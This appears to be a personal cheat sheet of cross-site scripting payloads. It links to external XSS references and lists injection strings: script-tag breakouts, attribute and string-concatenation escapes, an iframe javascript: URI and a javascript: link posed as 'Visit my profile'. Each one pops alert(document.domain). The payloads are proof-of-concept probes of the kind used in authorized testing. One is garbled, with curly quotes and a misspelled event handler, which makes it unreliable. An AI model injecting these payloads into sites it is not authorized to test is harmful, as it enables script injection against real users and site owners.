#xss 

## Resources
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45 

## Base
```html
<script>alert("XSS")</script>
```

```html
<script>alert(document.domain)</script>
```

## Others
```html
"><script>alert(document.domain)</script>
```

```html
</script><script>alert(document.domain)</script>
```

```html
<iframe src="javascript:alert(`document.domain`)"> 
```

```js
'+alert(document.domain)+'
```

```js
http://“onmousover=”alert(document.domain)
```

##  In URL
### Payload
```js
 javascript:alert(document.domain)
```

### Injected
```html
<a href="javascript:alert(document.domain)">Visit my profile</a>
```